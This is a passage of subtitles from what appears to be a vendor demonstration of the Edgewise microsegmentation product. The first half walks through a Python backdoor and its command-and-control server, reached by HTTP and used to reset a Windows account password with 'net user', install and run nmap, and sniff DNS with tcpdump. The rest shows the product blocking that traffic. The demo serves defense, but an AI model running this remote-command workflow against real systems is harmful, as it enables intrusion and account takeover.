00:17:32,630 --> 00:17:36,920
would try to randomize it with much

463
00:17:34,730 --> 00:17:38,690
broader periods of time because they

464
00:17:36,920 --> 00:17:41,090
don't want you to see this periodic

465
00:17:38,690 --> 00:17:43,040
spike of connections out to update

466
00:17:41,090 --> 00:17:46,399
Python dot US you might do it once every

467
00:17:43,040 --> 00:17:49,220
hour and that would randomize for them

468
00:17:46,400 --> 00:17:51,350
that 60 60 minutes so that you don't see

469
00:17:49,220 --> 00:17:54,050
a very predictable pattern across all of

470
00:17:51,350 --> 00:17:56,179
your systems so we've got our pre letter

471
00:17:54,050 --> 00:17:59,240
which is the thing that tricks you into

472
00:17:56,180 --> 00:18:01,160
copy and pasting that then establishes

473
00:17:59,240 --> 00:18:03,350
persistence and runs the bootstrapper

474
00:18:01,160 --> 00:18:05,420
the bootstrapper simply checks to see if

475
00:18:03,350 --> 00:18:07,370
commands are available execute them and

476
00:18:05,420 --> 00:18:09,050
post the results back up to the command

477
00:18:07,370 --> 00:18:11,209
and control system the command and

478
00:18:09,050 --> 00:18:13,370
control system is a simple set of logic

479
00:18:11,210 --> 00:18:15,560
to say do I have a command do I have a

480
00:18:13,370 --> 00:18:17,239
response are you asking for information

481
00:18:15,560 --> 00:18:20,360
about a target so let's see how all of

482
00:18:17,240 --> 00:18:24,860
this plays out we're gonna ran run our

483
00:18:20,360 --> 00:18:26,360
command and control system and what

484
00:18:24,860 --> 00:18:29,629
we're gonna do is see that we've got our

485
00:18:26,360 --> 00:18:31,669
three devices connecting in now can I

486
00:18:29,630 --> 00:18:35,120
dispatch commands and how do I do that

487
00:18:31,670 --> 00:18:36,470
again I just go to an HTTP URL so I'm

488
00:18:35,120 --> 00:18:40,580
gonna come up here and I'm gonna say

489
00:18:36,470 --> 00:18:43,100
HTTP update Python us it's gonna prompt

490
00:18:40,580 --> 00:18:44,899
me to approve and now what I see is a

491
00:18:43,100 --> 00:18:46,850
listing of all the devices that are

492
00:18:44,900 --> 00:18:48,500
registered it gives me a status showing

493
00:18:46,850 --> 00:18:50,480
the last time I checked in if I hit the

494
00:18:48,500 --> 00:18:52,910
refresh you can see that it's changed

495
00:18:50,480 --> 00:18:55,130
the time stance of the last refresh so

496
00:18:52,910 --> 00:18:56,120
what can an attacker really do with

497
00:18:55,130 --> 00:18:58,940
these sorts of command and control

498
00:18:56,120 --> 00:19:01,129
systems and the answer unsurprisingly is

499
00:18:58,940 --> 00:19:03,680
virtually anything but even though you

500
00:19:01,130 --> 00:19:05,690
know it's anything the results will

501
00:19:03,680 --> 00:19:09,080
sometimes surprise you so for instance

502
00:19:05,690 --> 00:19:11,090
what if I wanted to look at the users on

503
00:19:09,080 --> 00:19:14,659
a given machine like one of these

504
00:19:11,090 --> 00:19:19,280
Windows machines so I say target equals

505
00:19:14,660 --> 00:19:22,580
a do two and I say command equals and

506
00:19:19,280 --> 00:19:24,649
that user command great so you can see

507
00:19:22,580 --> 00:19:25,760
it registered the command net user now

508
00:19:24,650 --> 00:19:28,850
if you get rid of the come

509
00:19:25,760 --> 00:19:30,560
we can see the result the result is it

510
00:19:28,850 --> 00:19:32,149
listed out all the user accounts we've

511
00:19:30,560 --> 00:19:34,340
got the administrator default desktop

512
00:19:32,150 --> 00:19:37,100
edge admin so on and so forth now what

513
00:19:34,340 --> 00:19:39,379
if I wanted to actually change the the

514
00:19:37,100 --> 00:19:42,110
password of one of these all I do is net

515
00:19:39,380 --> 00:19:43,700
user I'll use the test account just so

516
00:19:42,110 --> 00:19:47,719
I'm not messing with anything and I say

517
00:19:43,700 --> 00:19:49,130
I'll just create a password a a55 I want

518
00:19:47,720 --> 00:19:52,550
to make sure I meet those complexity

519
00:19:49,130 --> 00:19:55,940
requirements that were said no and I run

520
00:19:52,550 --> 00:19:57,590
it so did it execute correctly let's see

521
00:19:55,940 --> 00:19:59,660
the results there it is the command

522
00:19:57,590 --> 00:20:01,639
completed successfully meaning we just

523
00:19:59,660 --> 00:20:03,800
remotely changed the password on that

524
00:20:01,640 --> 00:20:05,360
Active Directory server for the test

525
00:20:03,800 --> 00:20:07,610
user account now what about the Linux

526
00:20:05,360 --> 00:20:13,669
systems if I come over here and I say

527
00:20:07,610 --> 00:20:17,419
Lin user tbo one and I say I want to do

528
00:20:13,670 --> 00:20:19,430
a command which is netstat to see what

529
00:20:17,420 --> 00:20:22,280
it's communicating with great it

530
00:20:19,430 --> 00:20:25,100
registered nets at a.m. and I get rid of

531
00:20:22,280 --> 00:20:27,710
the command here and now I can see the

532
00:20:25,100 --> 00:20:29,300
results so I'm looking at this guy and I

533
00:20:27,710 --> 00:20:34,220
say oh this looks like an interesting

534
00:20:29,300 --> 00:20:36,350
address I want to scan that so use a map

535
00:20:34,220 --> 00:20:38,840
but do I know if an app is actually

536
00:20:36,350 --> 00:20:41,000
installed well we can very easily find

537
00:20:38,840 --> 00:20:43,780
out just by saying command and then

538
00:20:41,000 --> 00:20:48,830
saying yum

539
00:20:43,780 --> 00:20:51,289
list installed and map

540
00:20:48,830 --> 00:20:54,529
it registered the command now let's see

541
00:20:51,289 --> 00:20:56,899
what the results are all right so that

542
00:20:54,529 --> 00:21:00,140
truncated response means that it is not

543
00:20:56,899 --> 00:21:03,799
actually installed so what we can do

544
00:21:00,140 --> 00:21:05,870
then is just say command and again what

545
00:21:03,799 --> 00:21:09,860
we're gonna do is very simple we say

546
00:21:05,870 --> 00:21:13,299
sudo yum - why install nmap so it's

547
00:21:09,860 --> 00:21:16,209
registered now let's see what it does

548
00:21:13,299 --> 00:21:17,110
still thinking about it there it is so

549
00:21:16,210 --> 00:21:19,509
there we go

550
00:21:17,110 --> 00:21:21,998
verified and map installed and map

551
00:21:19,509 --> 00:21:23,529
complete so we've installed an app on

552
00:21:21,999 --> 00:21:26,039
the system by the command and control

553
00:21:23,529 --> 00:21:29,049
system now let's actually use it for

554
00:21:26,039 --> 00:21:31,960
something so what we're gonna do is nmap

555
00:21:29,049 --> 00:21:34,869
scan the address that we found from that

556
00:21:31,960 --> 00:21:37,419
step we just registered it now let's see

557
00:21:34,869 --> 00:21:40,959
what the results are we can see port 22

558
00:21:37,419 --> 00:21:42,639
is open for ssh in port 8080 4 which is

559
00:21:40,960 --> 00:21:45,009
an unknown protocol but what about

560
00:21:42,639 --> 00:21:46,330
looking at traffic and watching the

561
00:21:45,009 --> 00:21:50,109
administrator do what they're doing

562
00:21:46,330 --> 00:21:53,859
I could actually perhaps do a TCP dump

563
00:21:50,109 --> 00:21:56,289
so all I need to do is say pseudo TCP

564
00:21:53,859 --> 00:22:00,070
dump and we're just gonna look for one

565
00:21:56,289 --> 00:22:02,019
packet and we'll look on port 53 so that

566
00:22:00,070 --> 00:22:03,460
we can watch the DNS requests that

567
00:22:02,019 --> 00:22:07,330
they're making so again we need to

568
00:22:03,460 --> 00:22:11,609
encode this so we do 26 for the

569
00:22:07,330 --> 00:22:11,609
ampersand and run map

570
00:22:13,510 --> 00:22:19,210
now we don't make a lot of DMS requests

571
00:22:16,480 --> 00:22:24,130
so why don't I just make one myself I'm

572
00:22:19,210 --> 00:22:26,650
gonna go and look up google.com great so

573
00:22:24,130 --> 00:22:29,559
a DNS request has been made let's see

574
00:22:26,650 --> 00:22:32,980
what it descends there it is there's the

575
00:22:29,559 --> 00:22:35,470
tcp dump output for my DNS query for

576
00:22:32,980 --> 00:22:38,590
google.com this is obviously a big

577
00:22:35,470 --> 00:22:40,900
problem and we need to resolve this

578
00:22:38,590 --> 00:22:43,540
using techniques that are effective

579
00:22:40,900 --> 00:22:46,510
against low-level Python script based

580
00:22:43,540 --> 00:22:51,129
backdoors so what is the answer here the

581
00:22:46,510 --> 00:22:52,840
answer in my mind is identity identity

582
00:22:51,130 --> 00:22:54,880
is the answer because it truly

583
00:22:52,840 --> 00:22:56,860
identifies what is communicating not

584
00:22:54,880 --> 00:22:58,240
just how it's communicating firewalls

585
00:22:56,860 --> 00:23:00,490
look at addresses ports and protocols

586
00:22:58,240 --> 00:23:02,440
which is the means by which two things

587
00:23:00,490 --> 00:23:05,260
communicate but it doesn't really tell

588
00:23:02,440 --> 00:23:07,179
you what is communicating identity tells

589
00:23:05,260 --> 00:23:09,129
you the cryptographic identity that

590
00:23:07,179 --> 00:23:11,230
would be the signing certificates the PE

591
00:23:09,130 --> 00:23:13,450
headers the sha-256 other immutable

592
00:23:11,230 --> 00:23:15,520
attributes of the software that made and

593
00:23:13,450 --> 00:23:17,230
received the connection the user that

594
00:23:15,520 --> 00:23:18,730
executed that software the container

595
00:23:17,230 --> 00:23:21,160
that it was running in and the device

596
00:23:18,730 --> 00:23:23,230
that it was executed on so software user

597
00:23:21,160 --> 00:23:24,940
container and host validated on both

598
00:23:23,230 --> 00:23:26,799
sides of the connection to ensure that

599
00:23:24,940 --> 00:23:28,990
only legitimate services are

600
00:23:26,799 --> 00:23:30,580
communicated this gets down to a very

601
00:23:28,990 --> 00:23:32,799
fundamental level down to the Python

602
00:23:30,580 --> 00:23:34,750
script down to the Java jar down to the

603
00:23:32,799 --> 00:23:37,360
Ruby script it's a sub process

604
00:23:34,750 --> 00:23:39,100
validation of software identity using

605
00:23:37,360 --> 00:23:41,260
immutable attributes that cannot be

606
00:23:39,100 --> 00:23:43,689
manipulated by the attacker without it

607
00:23:41,260 --> 00:23:45,970
changing the identity fundamentally so

608
00:23:43,690 --> 00:23:48,340
let's see how easy it is to mitigate

609
00:23:45,970 --> 00:23:51,070
these these actions and what we expect

610
00:23:48,340 --> 00:23:53,049
to see is first we want to stop the

611
00:23:51,070 --> 00:23:54,879
systems that are connecting into the

612
00:23:53,049 --> 00:23:56,440
command and control system from being

613
00:23:54,880 --> 00:23:58,960
able to communicate then we've got

614
00:23:56,440 --> 00:24:01,360
multi-platform windows and linux running

615
00:23:58,960 --> 00:24:03,370
in different environments AWS on Prem so

616
00:24:01,360 --> 00:24:06,159
on and so forth so what I want to do is

617
00:24:03,370 --> 00:24:07,840
use one policy to completely cut off all

618
00:24:06,160 --> 00:24:09,549
of this communication what we're gonna

619
00:24:07,840 --> 00:24:12,309
do is log in to the edge wise platform

620
00:24:09,549 --> 00:24:13,900
edge wise I need to give out a little

621
00:24:12,309 --> 00:24:15,549
background on what we're what we're

622
00:24:13,900 --> 00:24:17,980
seeing here edge wise divides the world

623
00:24:15,549 --> 00:24:19,629
into two object types we've got host

624
00:24:17,980 --> 00:24:21,730
segments which are groups of hosts and

625
00:24:19,630 --> 00:24:23,590
app collections which are groups of

626
00:24:21,730 --> 00:24:26,210
software so in this particular case

627
00:24:23,590 --> 00:24:28,340
we're gonna take the admin tools object

628
00:24:26,210 --> 00:24:31,070
admin tools is defined very simply as

629
00:24:28,340 --> 00:24:33,409
this list of nine pieces of software

630
00:24:31,070 --> 00:24:35,870
running on any device in the environment

631
00:24:33,410 --> 00:24:37,610
so what we're gonna do is take the admin

632
00:24:35,870 --> 00:24:39,800
tools and look at its connections map

633
00:24:37,610 --> 00:24:42,409
the connections this is a map of all

634
00:24:39,800 --> 00:24:44,659
communications between these admin tools

635
00:24:42,410 --> 00:24:48,320
and all other software so you can see

636
00:24:44,660 --> 00:24:49,670
netcat and map sshd engine X and these

637
00:24:48,320 --> 00:24:51,919
are all of the admin tools that

638
00:24:49,670 --> 00:24:53,390
communicate but note these admin tools

639
00:24:51,920 --> 00:24:55,130
are communicating with the globally

640
00:24:53,390 --> 00:24:56,780
routable internet which is something

641
00:24:55,130 --> 00:24:58,850
that by default you don't want your

642
00:24:56,780 --> 00:25:00,410
Administrative Tools to be able to do so

643
00:24:58,850 --> 00:25:01,730
we're gonna build a policy that stops

644
00:25:00,410 --> 00:25:03,290
the administrative tools from

645
00:25:01,730 --> 00:25:05,270
communicating with the globally routable

646
00:25:03,290 --> 00:25:06,860
internet without disrupting other

647
00:25:05,270 --> 00:25:09,200
administrative tools that need that

648
00:25:06,860 --> 00:25:11,149
access so we'll go to policy builder and

649
00:25:09,200 --> 00:25:13,030
we'll say administrative tools and we'll

650
00:25:11,150 --> 00:25:17,240
add the globally routable intranet and

651
00:25:13,030 --> 00:25:20,240
we'll say global unmanaged from admin

652
00:25:17,240 --> 00:25:22,010
tools is blocked within a couple seconds

653
00:25:20,240 --> 00:25:23,420
what we're going to see here is that all

654
00:25:22,010 --> 00:25:26,150
of these communications that are

655
00:25:23,420 --> 00:25:28,670
happening from these bootstrappers are

656
00:25:26,150 --> 00:25:32,330
going to stop and there it is

657
00:25:28,670 --> 00:25:34,850
for Linna pay a 1 when user TV a 1 a do

658
00:25:32,330 --> 00:25:37,520
to one policy covering both Windows and

659
00:25:34,850 --> 00:25:39,980
Linux those communications are severed

660
00:25:37,520 --> 00:25:42,500
now for legitimate communications that

661
00:25:39,980 --> 00:25:46,160
need to happen for instance the admin

662
00:25:42,500 --> 00:25:48,020
script PI I can still use admin script

663
00:25:46,160 --> 00:25:49,700
that PI to communicate with the Internet

664
00:25:48,020 --> 00:25:52,280
this is downloading some data from

665
00:25:49,700 --> 00:25:53,930
google.com so my administrative tools

666
00:25:52,280 --> 00:25:55,850
continue to function but the attackers

667
00:25:53,930 --> 00:25:58,220
tools do not and to further that point

668
00:25:55,850 --> 00:26:01,520
if I were to launch Python and use the

669
00:25:58,220 --> 00:26:07,600
interactive Python and sake requests and

670
00:26:01,520 --> 00:26:12,590
then say print requests yet and do HTTP

671
00:26:07,600 --> 00:26:15,500
double dot com and get the text version

672
00:26:12,590 --> 00:26:17,750
and run that what you can see is the

673
00:26:15,500 --> 00:26:20,570
edgewise platform can differentiate an

674
00:26:17,750 --> 00:26:22,520
interactive Python shell versus the

675
00:26:20,570 --> 00:26:24,800
Python script that I executed previously

676
00:26:22,520 --> 00:26:28,510
this interactive Python shell gets a

677
00:26:24,800 --> 00:26:28,510
permission denied whereas

678
00:26:29,170 --> 00:26:33,820
the admin script is able to communicate

679
00:26:31,000 --> 00:26:35,470
so sub process level software identity

680
00:26:33,820 --> 00:26:37,720
verified on both sides of the connection

681
00:26:35,470 --> 00:26:40,090
to prevent malicious software from

682
00:26:37,720 --> 00:26:42,670
gaining access it should not have now

683
00:26:40,090 --> 00:26:44,860
what about preventing installation if I

684
00:26:42,670 --> 00:26:46,990
take one of these systems and I clean it

685
00:26:44,860 --> 00:26:49,149
up so that it doesn't have the

686
00:26:46,990 --> 00:26:52,090
bootstrapper or preloader but what I'm

687
00:26:49,150 --> 00:26:55,330
gonna do is say on tab - II I'm gonna

688
00:26:52,090 --> 00:27:01,919
get rid of the persistence and then psdf

689
00:26:55,330 --> 00:27:01,919
grep Python and I'm going to kill this

690
00:27:03,000 --> 00:27:06,180
you can see that it's gone it's cleaned

691
00:27:05,010 --> 00:27:08,430
up and it's not coming back

692
00:27:06,180 --> 00:27:12,450
so now what I'm gonna do is go back to

693
00:27:08,430 --> 00:27:15,810
my watering hole I'm going to copy the

694
00:27:12,450 --> 00:27:19,650
benign looking scrip and I'm going to

695
00:27:15,810 --> 00:27:21,899
paste it in and the question is was this

696
00:27:19,650 --> 00:27:24,180
effective you can see our command and

697
00:27:21,900 --> 00:27:28,620
control system is running now did it get

698
00:27:24,180 --> 00:27:30,860
persistence nope no persistence is it

699
00:27:28,620 --> 00:27:30,860
running

700
00:27:32,440 --> 00:27:36,550
no it is not this protection isn't just

701
00:27:34,930 --> 00:27:38,290
about preventing the back door from

702
00:27:36,550 --> 00:27:40,389
communicating with that man in control

703
00:27:38,290 --> 00:27:42,760
system it actually mitigates the process

704
00:27:40,390 --> 00:27:45,400
of installation as well so this is

705
00:27:42,760 --> 00:27:47,290
really multifaceted protection here last

706
00:27:45,400 --> 00:27:48,190
but not least are we able to bypass the

707
00:27:47,290 --> 00:27:50,740
protection

708
00:27:48,190 --> 00:27:54,970
perhaps by removing edgewise so let's do

709
00:27:50,740 --> 00:27:57,730
a look around for edge once we see

710
00:27:54,970 --> 00:28:01,960
edgewise here what I'm gonna do is I'm

711
00:27:57,730 --> 00:28:04,030
going to do a pseudo kill - 9 on that

712
00:28:01,960 --> 00:28:06,670
process so as route kill - 9 the most

713
00:28:04,030 --> 00:28:09,310
severe signal you can give it and let's

714
00:28:06,670 --> 00:28:11,470
see what it does no you can't kill the

715
00:28:09,310 --> 00:28:13,240
process edgewise actually protects

716
00:28:11,470 --> 00:28:15,070
itself to prevent the attacker from

717
00:28:13,240 --> 00:28:17,410
killing the process or removing the

718
00:28:15,070 --> 00:28:19,899
software entirely really what this all

719
00:28:17,410 --> 00:28:22,210
boils down to is we've simplified the

720
00:28:19,900 --> 00:28:24,250
process of micro segmentation leveraging

721
00:28:22,210 --> 00:28:26,260
identity and automation down to a single

722
00:28:24,250 --> 00:28:27,820
click you can fully micro segment your

723
00:28:26,260 --> 00:28:30,580
environment whether doing administrative

724
00:28:27,820 --> 00:28:32,980
tool protection or full-blown micro

725
00:28:30,580 --> 00:28:34,480
segmentation with a very simple set of

726
00:28:32,980 --> 00:28:37,740
policies that cover all of your

727
00:28:34,480 --> 00:28:37,740
environments all of your platforms

